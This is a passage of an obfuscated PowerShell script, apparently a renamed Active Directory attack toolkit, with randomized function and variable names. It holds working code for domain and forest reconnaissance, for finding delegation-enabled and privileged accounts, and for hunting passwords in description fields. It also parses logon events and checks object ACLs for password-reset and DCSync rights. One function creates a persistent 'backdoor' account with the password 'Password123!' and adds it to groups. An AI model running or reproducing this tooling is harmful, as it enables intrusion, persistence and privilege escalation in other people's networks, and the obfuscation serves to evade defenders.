                }
                
                New-Object -TypeName PSObject -Property $QQDWOvojOeRaVdg
            }
            else {
                Write-Warning "No proxy settings found for $kEneZcxTTiuFrPZ"
            }
        }
        catch {
            Write-Warning "Error enumerating proxy settings for $kEneZcxTTiuFrPZ"
        }
    }
}


function teasing {

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [string]
        $Path,

        [Switch]
        $Okpdr9DpyZPCXBG
    )

    begin {

        function buckeye {



            [CmdletBinding()]
            param(
                [Int]
                $FSR
            )

            $AccessMask = @{
              [uint32]'0x80000000' = 'GenericRead'
              [uint32]'0x40000000' = 'GenericWrite'
              [uint32]'0x20000000' = 'GenericExecute'
              [uint32]'0x10000000' = 'GenericAll'
              [uint32]'0x02000000' = 'MaximumAllowed'
              [uint32]'0x01000000' = 'AccessSystemSecurity'
              [uint32]'0x00100000' = 'Synchronize'
              [uint32]'0x00080000' = 'WriteOwner'
              [uint32]'0x00040000' = 'WriteDAC'
              [uint32]'0x00020000' = 'ReadControl'
              [uint32]'0x00010000' = 'Delete'
              [uint32]'0x00000100' = 'WriteAttributes'
              [uint32]'0x00000080' = 'ReadAttributes'
              [uint32]'0x00000040' = 'DeleteChild'
              [uint32]'0x00000020' = 'Execute/Traverse'
              [uint32]'0x00000010' = 'WriteExtendedAttributes'
              [uint32]'0x00000008' = 'ReadExtendedAttributes'
              [uint32]'0x00000004' = 'AppendData/AddSubdirectory'
              [uint32]'0x00000002' = 'WriteData/AddFile'
              [uint32]'0x00000001' = 'ReadData/ListDirectory'
            }

            $ONgWtBhDwmIeR9K = @{
              [uint32]'0x1f01ff' = 'FullControl'
              [uint32]'0x0301bf' = 'Modify'
              [uint32]'0x0200a9' = 'ReadAndExecute'
              [uint32]'0x02019f' = 'ReadAndWrite'
              [uint32]'0x020089' = 'Read'
              [uint32]'0x000116' = 'Write'
            }

            $X9odkqb9RWH9sWa = @()


            $X9odkqb9RWH9sWa += $ONgWtBhDwmIeR9K.Keys |  % {
                              if (($FSR -band $_) -eq $_) {
                                $ONgWtBhDwmIeR9K[$_]
                                $FSR = $FSR -band (-not $_)
                              }
                            }


            $X9odkqb9RWH9sWa += $AccessMask.Keys |
                            ? { $FSR -band $_ } |
                            % { $AccessMask[$_] }

            ($X9odkqb9RWH9sWa | ?{$_}) -join ","
        }
    }

    process {

        try {
            $ACL = Get-Acl -Path $Path

            $ACL.GetAccessRules($true,$true,[System.Security.Principal.SecurityIdentifier]) | ForEach-Object {

                $Names = @()
                if ($_.IdentityReference -match '^S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+') {
                    $Object = bicycled -SID $_.IdentityReference
                    $Names = @()
                    $SIDs = @($Object.objectsid)

                    if ($Okpdr9DpyZPCXBG -and ($Object.samAccountType -ne "805306368")) {
                        $SIDs += confessedly -SID $Object.objectsid | Select-Object -ExpandProperty MemberSid
                    }

                    $SIDs | ForEach-Object {
                        $Names += ,@($_, (die $_))
                    }
                }
                else {
                    $Names += ,@($_.IdentityReference.Value, (die $_.IdentityReference.Value))
                }

                ForEach($Name in $Names) {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'Path' $Path
                    $Out | Add-Member Noteproperty 'FileSystemRights' (buckeye -FSR $_.FileSystemRights.value__)
                    $Out | Add-Member Noteproperty 'IdentityReference' $Name[1]
                    $Out | Add-Member Noteproperty 'IdentitySID' $Name[0]
                    $Out | Add-Member Noteproperty 'AccessControlType' $_.AccessControlType
                    $Out
                }
            }
        }
        catch {
            Write-Warning $_
        }
    }
}


function zone {



    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
        $Object
    )
    process {
        if($Object) {
            if ( [bool]($Object.PSobject.Properties.name -match "dnshostname") ) {

                $Object.dnshostname
            }
            elseif ( [bool]($Object.PSobject.Properties.name -match "name") ) {

                $Object.name
            }
            else {

                $Object
            }
        }
        else {
            return $Null
        }
    }
}


function educates {

    param(
        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
        [ValidateNotNullOrEmpty()]
        $QQDWOvojOeRaVdg
    )

    $oSJMXLbeU9iqjpF = @{}

    $QQDWOvojOeRaVdg.PropertyNames | ForEach-Object {
        if (($_ -eq "objectsid") -or ($_ -eq "sidhistory")) {

            $oSJMXLbeU9iqjpF[$_] = (New-Object System.Security.Principal.SecurityIdentifier($QQDWOvojOeRaVdg[$_][0],0)).Value
        }
        elseif($_ -eq "objectguid") {

            $oSJMXLbeU9iqjpF[$_] = (New-Object Guid (,$QQDWOvojOeRaVdg[$_][0])).Guid
        }
        elseif( ($_ -eq "lastlogon") -or ($_ -eq "lastlogontimestamp") -or ($_ -eq "pwdlastset") -or ($_ -eq "lastlogoff") -or ($_ -eq "badPasswordTime") ) {

            if ($QQDWOvojOeRaVdg[$_][0] -is [System.MarshalByRefObject]) {

                $Temp = $QQDWOvojOeRaVdg[$_][0]
                [Int32]$High = $Temp.GetType().InvokeMember("HighPart", [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                [Int32]$Low  = $Temp.GetType().InvokeMember("LowPart",  [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                $oSJMXLbeU9iqjpF[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $High, $Low)))
            }
            else {
                $oSJMXLbeU9iqjpF[$_] = ([datetime]::FromFileTime(($QQDWOvojOeRaVdg[$_][0])))
            }
        }
        elseif($QQDWOvojOeRaVdg[$_][0] -is [System.MarshalByRefObject]) {

            $Prop = $QQDWOvojOeRaVdg[$_]
            try {
                $Temp = $Prop[$_][0]
                Write-Verbose $_
                [Int32]$High = $Temp.GetType().InvokeMember("HighPart", [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                [Int32]$Low  = $Temp.GetType().InvokeMember("LowPart",  [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                $oSJMXLbeU9iqjpF[$_] = [Int64]("0x{0:x8}{1:x8}" -f $High, $Low)
            }
            catch {
                $oSJMXLbeU9iqjpF[$_] = $Prop[$_]
            }
        }
        elseif($QQDWOvojOeRaVdg[$_].count -eq 1) {
            $oSJMXLbeU9iqjpF[$_] = $QQDWOvojOeRaVdg[$_][0]
        }
        else {
            $oSJMXLbeU9iqjpF[$_] = $QQDWOvojOeRaVdg[$_]
        }
    }

    New-Object -TypeName PSObject -Property $oSJMXLbeU9iqjpF
}









function synonym {


    [CmdletBinding()]
    param(
        [String]
        $KKbtTlEQY9KtTfJ,

        [String]
        $ewHsaEFeoXOCPPv,

        [String]
        $GazxKCLDhxrDzgZ,

        [String]
        $UirdwsEp9cfwlHj,

        [ValidateRange(1,10000)] 
        [Int]
        $WRYKTaHSEUSKduK = 200
    )

    if(!$KKbtTlEQY9KtTfJ) {
        $KKbtTlEQY9KtTfJ = (skulked).name
    }
    else {
        if(!$ewHsaEFeoXOCPPv) {
            try {


                $ewHsaEFeoXOCPPv = ((skulked).PdcRoleOwner).Name
            }
            catch {
                throw "synonym: Error in retrieving PDC for current domain"
            }
        }
    }

    $hTchLzMrCIpEqmf = "LDAP://"

    if($ewHsaEFeoXOCPPv) {
        $hTchLzMrCIpEqmf += $ewHsaEFeoXOCPPv + "/"
    }
    if($UirdwsEp9cfwlHj) {
        $hTchLzMrCIpEqmf += $UirdwsEp9cfwlHj + ","
    }

    if($GazxKCLDhxrDzgZ) {
        if($GazxKCLDhxrDzgZ -like "GC://*") {

            $gLCImVp9wWzIBxH = $GazxKCLDhxrDzgZ
            $hTchLzMrCIpEqmf = ""
        }
        else {
            if($GazxKCLDhxrDzgZ -like "LDAP://*") {
                $GazxKCLDhxrDzgZ = $GazxKCLDhxrDzgZ.Substring(7)
            }
            $gLCImVp9wWzIBxH = $GazxKCLDhxrDzgZ
        }
    }
    else {
        $gLCImVp9wWzIBxH = "DC=$($KKbtTlEQY9KtTfJ.Replace('.', ',DC='))"
    }

    $hTchLzMrCIpEqmf += $gLCImVp9wWzIBxH
    Write-Verbose "synonym search string: $hTchLzMrCIpEqmf"

    $vmKAjeiLpGRmxne = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$hTchLzMrCIpEqmf)
    $vmKAjeiLpGRmxne.PageSize = $WRYKTaHSEUSKduK
    $vmKAjeiLpGRmxne
}


function skulked {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $KKbtTlEQY9KtTfJ
    )

    process {
        if($KKbtTlEQY9KtTfJ) {
            $sfaNEgV9zVS9sTJ = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $KKbtTlEQY9KtTfJ)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($sfaNEgV9zVS9sTJ)
            }
            catch {
                Write-Warning "The specified domain $KKbtTlEQY9KtTfJ does not exist, could not be contacted, or there isn't an existing trust."
                $Null
            }
        }
        else {
            [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        }
    }
}


function televisions {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $zWStlpoeAEeGomT
    )

    process {
        if($zWStlpoeAEeGomT) {
            $bNipiIWgXToOl99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $zWStlpoeAEeGomT)
            try {
                $9y9slHjeisMbdrF = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($bNipiIWgXToOl99)
            }
            catch {
                Write-Debug "The specified forest $zWStlpoeAEeGomT does not exist, could not be contacted, or there isn't an existing trust."
                $Null
            }
        }
        else {

            $9y9slHjeisMbdrF = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
        }

        if($9y9slHjeisMbdrF) {

            $x9l9rBbqhZZBPxh = (New-Object System.Security.Principal.NTAccount($9y9slHjeisMbdrF.RootDomain,"krbtgt")).Translate([System.Security.Principal.SecurityIdentifier]).Value
            $Parts = $x9l9rBbqhZZBPxh -Split "-"
            $x9l9rBbqhZZBPxh = $Parts[0..$($Parts.length-2)] -join "-"
            $9y9slHjeisMbdrF | Add-Member NoteProperty 'RootDomainSid' $x9l9rBbqhZZBPxh
            $9y9slHjeisMbdrF
        }
    }
}


function misdirects {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $zWStlpoeAEeGomT,

        [String]
        $KKbtTlEQY9KtTfJ
    )

    process {
        if($KKbtTlEQY9KtTfJ) {

            if($KKbtTlEQY9KtTfJ.Contains('*')) {
                (televisions -zWStlpoeAEeGomT $zWStlpoeAEeGomT).Domains | Where-Object {$_.Name -like $KKbtTlEQY9KtTfJ}
            }
            else {

                (televisions -zWStlpoeAEeGomT $zWStlpoeAEeGomT).Domains | Where-Object {$_.Name.ToLower() -eq $KKbtTlEQY9KtTfJ.ToLower()}
            }
        }
        else {

            $9y9slHjeisMbdrF = televisions -zWStlpoeAEeGomT $zWStlpoeAEeGomT
            if($9y9slHjeisMbdrF) {
                $9y9slHjeisMbdrF.Domains
            }
        }
    }
}


function ballads {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $zWStlpoeAEeGomT
    )

    process {
        $9y9slHjeisMbdrF = televisions -zWStlpoeAEeGomT $zWStlpoeAEeGomT
        if($9y9slHjeisMbdrF) {
            $9y9slHjeisMbdrF.FindAllGlobalCatalogs()
        }
    }
}


function odometer {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $KKbtTlEQY9KtTfJ,

        [String]
        $ewHsaEFeoXOCPPv,

        [Switch]
        $LDAP
    )

    process {
        if($LDAP -or $ewHsaEFeoXOCPPv) {

            Randal -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -wD9BSmPbiJRFWDu -DshCfudiWKUrQer '(userAccountControl:1.2.840.113556.1.4.803:=8192)'
        }
        else {
            $xJgvwcdGvZSwwyk = skulked -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ
            
            if($xJgvwcdGvZSwwyk) {
                $xJgvwcdGvZSwwyk.DomainControllers
            }
        }
    }
}








function Houyhnhnm {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $IuM9ojehadqRMJF,

        [String]
        $KKbtTlEQY9KtTfJ,

        [String]
        $ewHsaEFeoXOCPPv,

        [String]
        $GazxKCLDhxrDzgZ,

        [String]
        $DshCfudiWKUrQer,

        [Switch]
        $SPN,

        [Switch]
        $IWQGvaMfQCkbauo,

        [Switch]
        $tXJXRLTbTAiviMb,

        [Switch]
        $CAVdCnsrnxVjiLz,

        [ValidateRange(1,10000)] 
        [Int]
        $WRYKTaHSEUSKduK = 200
    )

    begin {

        $UYxnBsUsbzUwdMH = synonym -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -GazxKCLDhxrDzgZ $GazxKCLDhxrDzgZ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK
    }

    process {
        if($UYxnBsUsbzUwdMH) {


            if($tXJXRLTbTAiviMb) {
                Write-Verbose "Checking for unconstrained delegation"
                $DshCfudiWKUrQer += "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
            }
            if($CAVdCnsrnxVjiLz) {
                Write-Verbose "Checking for users who can be delegated"

                $DshCfudiWKUrQer += "(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))"
            }
            if($IWQGvaMfQCkbauo) {
                Write-Verbose "Checking for adminCount=1"
                $DshCfudiWKUrQer += "(admincount=1)"
            }


            if($IuM9ojehadqRMJF) {

                $UYxnBsUsbzUwdMH.filter="(&(samAccountType=805306368)(samAccountName=$IuM9ojehadqRMJF)$DshCfudiWKUrQer)"
            }
            elseif($SPN) {
                $UYxnBsUsbzUwdMH.filter="(&(samAccountType=805306368)(servicePrincipalName=*)$DshCfudiWKUrQer)"
            }
            else {

                $UYxnBsUsbzUwdMH.filter="(&(samAccountType=805306368)$DshCfudiWKUrQer)"
            }

            $UYxnBsUsbzUwdMH.FindAll() | Where-Object {$_} | ForEach-Object {

                educates -QQDWOvojOeRaVdg $_.Properties
            }
        }
    }
}


function origami {


    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $IuM9ojehadqRMJF = 'backdoor',

        [ValidateNotNullOrEmpty()]
        [String]
        $bGPW99RQpxRKQAC = 'Password123!',

        [ValidateNotNullOrEmpty()]
        [String]
        $hIqWczrXxNjFAmP,

        [ValidateNotNullOrEmpty()]
        [Alias('HostName')]
        [String]
        $kEneZcxTTiuFrPZ = 'localhost',

        [ValidateNotNullOrEmpty()]
        [String]
        $KKbtTlEQY9KtTfJ
    )

    if ($KKbtTlEQY9KtTfJ) {

        $JgJJY9wwqrPxcjp = skulked -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ
        if(-not $JgJJY9wwqrPxcjp) {
            Write-Warning "Error in grabbing $KKbtTlEQY9KtTfJ object"
            return $Null
        }


        Add-Type -AssemblyName System.DirectoryServices.AccountManagement



        $oZfozauOLwQjmQ9 = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain), $JgJJY9wwqrPxcjp


        $User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList $oZfozauOLwQjmQ9


        $User.Name = $IuM9ojehadqRMJF
        $User.SamAccountName = $IuM9ojehadqRMJF
        $User.PasswordNotRequired = $False
        $User.SetPassword($bGPW99RQpxRKQAC)
        $User.Enabled = $True

        Write-Verbose "Creating user $IuM9ojehadqRMJF to with password '$bGPW99RQpxRKQAC' in domain $KKbtTlEQY9KtTfJ"

        try {

            $User.Save()
            "[*] User $IuM9ojehadqRMJF successfully created in domain $KKbtTlEQY9KtTfJ"
        }
        catch {
            Write-Warning '[!] User already exists!'
            return
        }
    }
    else {
        
        Write-Verbose "Creating user $IuM9ojehadqRMJF to with password '$bGPW99RQpxRKQAC' on $kEneZcxTTiuFrPZ"


        $ObjOu = [ADSI]"WinNT://$kEneZcxTTiuFrPZ"
        $RXGJUkyWuMubiGd = $ObjOu.Create('User', $IuM9ojehadqRMJF)
        $RXGJUkyWuMubiGd.SetPassword($bGPW99RQpxRKQAC)


        try {
            $Null = $RXGJUkyWuMubiGd.SetInfo()
            "[*] User $IuM9ojehadqRMJF successfully created on host $kEneZcxTTiuFrPZ"
        }
        catch {
            Write-Warning '[!] Account already exists!'
            return
        }
    }


    if ($hIqWczrXxNjFAmP) {

        if ($KKbtTlEQY9KtTfJ) {
            accidental -IuM9ojehadqRMJF $IuM9ojehadqRMJF -hIqWczrXxNjFAmP $hIqWczrXxNjFAmP -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ
            "[*] User $IuM9ojehadqRMJF successfully added to group $hIqWczrXxNjFAmP in domain $KKbtTlEQY9KtTfJ"
        }

        else {
            accidental -IuM9ojehadqRMJF $IuM9ojehadqRMJF -hIqWczrXxNjFAmP $hIqWczrXxNjFAmP -kEneZcxTTiuFrPZ $kEneZcxTTiuFrPZ
            "[*] User $IuM9ojehadqRMJF successfully added to group $hIqWczrXxNjFAmP on host $kEneZcxTTiuFrPZ"
        }
    }
}


function accidental {


    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $IuM9ojehadqRMJF,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $hIqWczrXxNjFAmP,

        [ValidateNotNullOrEmpty()]
        [Alias('HostName')]
        [String]
        $kEneZcxTTiuFrPZ,

        [String]
        $KKbtTlEQY9KtTfJ
    )


    Add-Type -AssemblyName System.DirectoryServices.AccountManagement


    if($kEneZcxTTiuFrPZ -and ($kEneZcxTTiuFrPZ -ne "localhost")) {
        try {
            Write-Verbose "Adding user $IuM9ojehadqRMJF to $hIqWczrXxNjFAmP on host $kEneZcxTTiuFrPZ"
            ([ADSI]"WinNT://$kEneZcxTTiuFrPZ/$hIqWczrXxNjFAmP,group").add("WinNT://$kEneZcxTTiuFrPZ/$IuM9ojehadqRMJF,user")
            "[*] User $IuM9ojehadqRMJF successfully added to group $hIqWczrXxNjFAmP on $kEneZcxTTiuFrPZ"
        }
        catch {
            Write-Warning "[!] Error adding user $IuM9ojehadqRMJF to group $hIqWczrXxNjFAmP on $kEneZcxTTiuFrPZ"
            return
        }
    }


    else {
        try {
            if ($KKbtTlEQY9KtTfJ) {
                Write-Verbose "Adding user $IuM9ojehadqRMJF to $hIqWczrXxNjFAmP on domain $KKbtTlEQY9KtTfJ"
                $CT = [System.DirectoryServices.AccountManagement.ContextType]::Domain
                $JgJJY9wwqrPxcjp = skulked -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ
                if(-not $JgJJY9wwqrPxcjp) {
                    return $Null
                }

                $oZfozauOLwQjmQ9 = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList $CT, $JgJJY9wwqrPxcjp            
            }
            else {

                Write-Verbose "Adding user $IuM9ojehadqRMJF to $hIqWczrXxNjFAmP on localhost"
                $oZfozauOLwQjmQ9 = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine, $Env:ComputerName)
            }


            $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($oZfozauOLwQjmQ9,$hIqWczrXxNjFAmP)


            $Group.Members.add($oZfozauOLwQjmQ9, [System.DirectoryServices.AccountManagement.IdentityType]::SamAccountName, $IuM9ojehadqRMJF)


            $Group.Save()
        }
        catch {
            Write-Warning "Error adding $IuM9ojehadqRMJF to $hIqWczrXxNjFAmP : $_"
        }
    }
}


function defoliation {


    [CmdletBinding()]
    param(
        [String[]]
        $QQDWOvojOeRaVdg,

        [String]
        $KKbtTlEQY9KtTfJ,
        
        [String]
        $ewHsaEFeoXOCPPv,

        [ValidateRange(1,10000)] 
        [Int]
        $WRYKTaHSEUSKduK = 200
    )

    if($QQDWOvojOeRaVdg) {

        $QQDWOvojOeRaVdg = ,"name" + $QQDWOvojOeRaVdg
        Houyhnhnm -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK | Select-Object -Property $QQDWOvojOeRaVdg
    }
    else {

        Houyhnhnm -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK | Select-Object -First 1 | Get-Member -MemberType *Property | Select-Object -Property 'Name'
    }
}


function criers {


    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [String]
        $YpxVXRyDDUvIVnp = 'pass',

        [String]
        $yZREVtj9QbvrBGd = 'description',

        [String]
        $GazxKCLDhxrDzgZ,

        [String]
        $KKbtTlEQY9KtTfJ,

        [String]
        $ewHsaEFeoXOCPPv,

        [ValidateRange(1,10000)] 
        [Int]
        $WRYKTaHSEUSKduK = 200
    )

    process {
        Houyhnhnm -GazxKCLDhxrDzgZ $GazxKCLDhxrDzgZ -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -DshCfudiWKUrQer "($yZREVtj9QbvrBGd=*$YpxVXRyDDUvIVnp*)" -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK | Select-Object samaccountname,$yZREVtj9QbvrBGd
    }
}


function Europeans {


    Param(
        [String]
        $kEneZcxTTiuFrPZ = $Env:ComputerName,

        [String]
        [ValidateSet("logon","tgt","all")]
        $dJ9yyFsNLIUpoOe = "logon",

        [DateTime]
        $ueJThwehxIOklTF=[DateTime]::Today.AddDays(-5)
    )

    if($dJ9yyFsNLIUpoOe.ToLower() -like "logon") {
        [Int32[]]$ID = @(4624)
    }
    elseif($dJ9yyFsNLIUpoOe.ToLower() -like "tgt") {
        [Int32[]]$ID = @(4768)
    }
    else {
        [Int32[]]$ID = @(4624, 4768)
    }


    Get-WinEvent -kEneZcxTTiuFrPZ $kEneZcxTTiuFrPZ -FilterHashTable @{ LogName = 'Security'; ID=$ID; StartTime=$ueJThwehxIOklTF} -ErrorAction SilentlyContinue | ForEach-Object {

        if($ID -contains 4624) {    

            if($_.message -match '(?s)(?<=Logon Type:).*?(?=(Impersonation Level:|New Logon:))') {
                if($Matches) {
                    $LogonType = $Matches[0].trim()
                    $Matches = $Null
                }
            }
            else {
                $LogonType = ""
            }


            if (($LogonType -eq 2) -or ($LogonType -eq 3)) {
                try {

                    if($_.message -match '(?s)(?<=New Logon:).*?(?=Process Information:)') {
                        if($Matches) {
                            $IuM9ojehadqRMJF = $Matches[0].split("`n")[2].split(":")[1].trim()
                            $KKbtTlEQY9KtTfJ = $Matches[0].split("`n")[3].split(":")[1].trim()
                            $Matches = $Null
                        }
                    }
                    if($_.message -match '(?s)(?<=Network Information:).*?(?=Source Port:)') {
                        if($Matches) {
                            $qypcznORZtUONGv = $Matches[0].split("`n")[2].split(":")[1].trim()
                            $Matches = $Null
                        }
                    }


                    if ($IuM9ojehadqRMJF -and (-not $IuM9ojehadqRMJF.endsWith('$')) -and ($IuM9ojehadqRMJF -ne 'ANONYMOUS LOGON')) {
                        $9vH99ZTXvKyANPK = @{
                            'Domain' = $KKbtTlEQY9KtTfJ
                            'ComputerName' = $kEneZcxTTiuFrPZ
                            'Username' = $IuM9ojehadqRMJF
                            'Address' = $qypcznORZtUONGv
                            'ID' = '4624'
                            'LogonType' = $LogonType
                            'Time' = $_.TimeCreated
                        }
                        New-Object -TypeName PSObject -Property $9vH99ZTXvKyANPK
                    }
                }
                catch {
                    Write-Debug "Error parsing event logs: $_"
                }
            }
        }
        if($ID -contains 4768) {

            try {
                if($_.message -match '(?s)(?<=Account Information:).*?(?=Service Information:)') {
                    if($Matches) {
                        $IuM9ojehadqRMJF = $Matches[0].split("`n")[1].split(":")[1].trim()
                        $KKbtTlEQY9KtTfJ = $Matches[0].split("`n")[2].split(":")[1].trim()
                        $Matches = $Null
                    }
                }

                if($_.message -match '(?s)(?<=Network Information:).*?(?=Additional Information:)') {
                    if($Matches) {
                        $qypcznORZtUONGv = $Matches[0].split("`n")[1].split(":")[-1].trim()
                        $Matches = $Null
                    }
                }

                $9vH99ZTXvKyANPK = @{
                    'Domain' = $KKbtTlEQY9KtTfJ
                    'ComputerName' = $kEneZcxTTiuFrPZ
                    'Username' = $IuM9ojehadqRMJF
                    'Address' = $qypcznORZtUONGv
                    'ID' = '4768'
                    'LogonType' = ''
                    'Time' = $_.TimeCreated
                }

                New-Object -TypeName PSObject -Property $9vH99ZTXvKyANPK
            }
            catch {
                Write-Debug "Error parsing event logs: $_"
            }
        }
    }
}


function undulate {


    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $KEeslQlCMbRmZZC,

        [String]
        $Name = "*",

        [Alias('DN')]
        [String]
        $gLCImVp9wWzIBxH = "*",

        [Switch]
        $9zUYEEdPnpgazQB,

        [String]
        $DshCfudiWKUrQer,

        [String]
        $GazxKCLDhxrDzgZ,

        [String]
        $UirdwsEp9cfwlHj,

        [String]
        [ValidateSet("All","ResetPassword","WriteMembers")]
        $d9pPKBkDdiicVAn,

        [String]
        $KKbtTlEQY9KtTfJ,

        [String]
        $ewHsaEFeoXOCPPv,

        [ValidateRange(1,10000)] 
        [Int]
        $WRYKTaHSEUSKduK = 200
    )

    begin {
        $vmKAjeiLpGRmxne = synonym -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -GazxKCLDhxrDzgZ $GazxKCLDhxrDzgZ -UirdwsEp9cfwlHj $UirdwsEp9cfwlHj -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK


        if($9zUYEEdPnpgazQB) {
            $GUIDs = Vonnegut -KKbtTlEQY9KtTfJ $KKbtTlEQY9KtTfJ -ewHsaEFeoXOCPPv $ewHsaEFeoXOCPPv -WRYKTaHSEUSKduK $WRYKTaHSEUSKduK
        }
    }

    process {

        if ($vmKAjeiLpGRmxne) {

            if($KEeslQlCMbRmZZC) {
                $vmKAjeiLpGRmxne.filter="(&(samaccountname=$KEeslQlCMbRmZZC)(name=$Name)(distinguishedname=$gLCImVp9wWzIBxH)$DshCfudiWKUrQer)"  
            }
            else {
                $vmKAjeiLpGRmxne.filter="(&(name=$Name)(distinguishedname=$gLCImVp9wWzIBxH)$DshCfudiWKUrQer)"  
            }
  
            try {
                $vmKAjeiLpGRmxne.FindAll() | Where-Object {$_} | Foreach-Object {
                    $Object = [adsi]($_.path)
                    if($Object.distinguishedname) {
                        $DRQHrKvgP9zvjrr = $Object.PsBase.ObjectSecurity.access
                        $DRQHrKvgP9zvjrr | ForEach-Object {
                            $_ | Add-Member NoteProperty 'ObjectDN' ($Object.distinguishedname[0])

                            if($Object.objectsid[0]){
                                $S = (New-Object System.Security.Principal.SecurityIdentifier($Object.objectsid[0],0)).Value
                            }
                            else {
                                $S = $Null
                            }
                            
                            $_ | Add-Member NoteProperty 'ObjectSID' $S
                            $_
                        }
                    }
                } | ForEach-Object {
                    if($d9pPKBkDdiicVAn) {
                        $qpgqKZtxeWKGwEj = Switch ($d9pPKBkDdiicVAn) {
                            "ResetPassword" { "00299570-246d-11d0-a768-00aa006e0529" }
                            "WriteMembers" { "bf9679c0-0de6-11d0-a285-00aa003049e2" }
                            Default { "00000000-0000-0000-0000-000000000000"}
                        }
                        if($_.ObjectType -eq $qpgqKZtxeWKGwEj) { $_ }
                    }
                    else {
                        $_
                    }
                } | Foreach-Object {
                    if($GUIDs) {

                        $kMNOK9MTBKGA9fO = @{}
                        $_.psobject.properties | ForEach-Object {
                            if( ($_.Name -eq 'ObjectType') -or ($_.Name -eq 'InheritedObjectType') ) {
                                try {
                                    $kMNOK9MTBKGA9fO[$_.Name] = $GUIDS[$_.Value.toString()]
                                }
                                catch {
                                    $kMNOK9MTBKGA9fO[$_.Name] = $_.Value
                                }
                            }
                            else {
                                $kMNOK9MTBKGA9fO[$_.Name] = $_.Value
                            }
                        }
                        New-Object -TypeName PSObject -Property $kMNOK9MTBKGA9fO
                    }
                    else { $_ }
                }
            }
            catch {
                Write-Warning $_
            }
        }
    }
}


function gay {


    [CmdletBinding()]
    Param (
        [String]
        $P9zADqxpBvcLNxH,

        [String]
        $eUVmPtzrlOpHgRH = "*",

        [Alias('DN')]
        [String]
        $FvbROQyrgvOdaq9 = "*",

        [String]
        $EnoJxjgcGVj9wxG,

        [String]
        $eorBTXSenoDqict,

        [String]
        $gVBAxxX9tPfwbwm,

        [String]
        [ValidatePattern('^S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+')]
        $dO9XoaRTPR99dpJ,

        [String]
        $yZ99uAMPn9ZX99M,

        [String]
        $qzWShJBLoZTtCF9,

        [String]
        [ValidateSet("All","ResetPassword","WriteMembers","DCSync")]
        $hnaAakdgBnpXILi = "All",

        [String]
        $DJtEHjOqQsdkg9m,

        [String]
        $KKbtTlEQY9KtTfJ,

        [String]
        $ewHsaEFeoXOCPPv,

        [ValidateRange(1,10000)] 
        [Int]
        $WRYKTaHSEUSKduK = 200
    )

    begin {
